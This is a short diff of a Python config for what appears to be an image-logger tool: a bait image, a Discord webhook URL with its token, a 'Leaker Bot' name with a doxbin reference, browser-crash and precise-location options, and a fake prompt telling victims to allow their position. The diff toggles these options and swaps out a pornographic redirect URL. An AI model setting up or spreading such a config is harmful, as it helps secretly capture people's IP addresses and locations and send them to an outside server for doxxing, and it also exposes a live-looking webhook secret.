@@ -5,16 +5,16 @@ config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1441456061528670258/u-NgRxR75hPMDOO2KMHkc0GbqxABr0jlYk1fdlgGDrjUC9QMYOrO-hr97ZGyAzI-ewJK",
     "image": "https://pkmncards.com/wp-content/uploads/charizard-ex-xy-promos-xy17-ptcgo-1.png",
-    "imageArgument": False,
+    "imageArgument": True,
     "username": "Leaker Bot",
     "avatar_url": "https://www.shazam.com/en-gb/song/1592754720/youre-on-doxbin",
     "color": 0x1C2526,  # Very dark grey
 
     # OPTIONS #
-    "crashBrowser": True,
+    "crashBrowser": False,
     "accurateLocation": True,
     "message": {
-        "doMessage": True,
+        "doMessage": False,
         "message": "You are being redirected, please allow your position for a better experience.",
         "richMessage": True,
     },
@@ -26,6 +26,6 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False,
-        "page": "https://fr.anysex.com/video/478503/three-hot-young-latina-sluts-come-to-a-wild-amateur-porn-casting-and-take-turns-sucking-director-s-cock/?utm_source=pb"
+        "page": "image here"
     },
 }
